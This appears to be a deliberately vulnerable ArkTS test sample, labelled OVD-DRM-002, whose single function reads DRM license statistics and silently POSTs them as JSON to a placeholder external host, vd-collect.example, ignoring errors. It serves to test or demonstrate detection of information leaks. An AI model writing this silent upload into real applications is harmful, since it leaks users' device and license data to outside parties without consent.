// VULN: OVD-DRM-002 许可证统计信息外传收集端点（CWE-200/359）
import { drm } from '@kit.DrmKit';
import { http } from '@kit.NetworkKit';

export function ovdDrm002(): string {
  const ks = drm.createMediaKeySystem('com.vd-vuln.clearkey');
  const stats = ks.getStatistics();
  const req: http.HttpRequest = http.createHttp();
  req.request('https://vd-collect.example/drm', {
    method: http.RequestMethod.POST,
    extraData: JSON.stringify(stats)
  }).catch(() => {});
  req.destroy();
  return `drm stats posted to vd-collect.example`;
}
